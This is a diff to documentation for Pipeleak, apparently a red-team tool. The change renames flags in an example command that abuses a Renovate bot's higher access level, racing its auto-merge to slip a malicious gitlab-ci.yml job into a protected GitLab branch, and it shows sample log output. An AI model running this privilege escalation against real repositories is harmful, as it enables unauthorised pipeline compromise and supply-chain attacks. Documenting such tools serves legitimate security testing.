@@ -120,7 +120,7 @@ Your goal is to abuse the Renovate bot's access level to merge a malicious `gitl
 Using Pipeleak, you can monitor your repository for new Renovate branches. When a new one is detected, Pipeleak tries to add a new job into the `gitlab-ci.yml`. As this needs to exploit a race condition (adding new changes to the Renovate branch before the bot activates auto-merge), this might take a few attempts.
 
 ```bash
-pipeleak gl renovate privesc -g https://gitlab.com -t glpat-[redacted] --repoName company1/a-software-project --renovateBranchesRegex 'renovate/.*' -v
+pipeleak gl renovate privesc -g https://gitlab.com -t glpat-[redacted] --repo-name company1/a-software-project --renovate-branches-regex 'renovate/.*' -v
 2025-09-30T07:56:57Z DBG Verbose log output enabled
 2025-09-30T07:56:57Z INF Ensure the Renovate bot does have a greater access level than you, otherwise this will not work, and is able to auto merge into the protected main branch
 2025-09-30T07:56:58Z DBG Testing push access level for default branch branch=main requiredAccessLevel=40 userAccessLevel=30
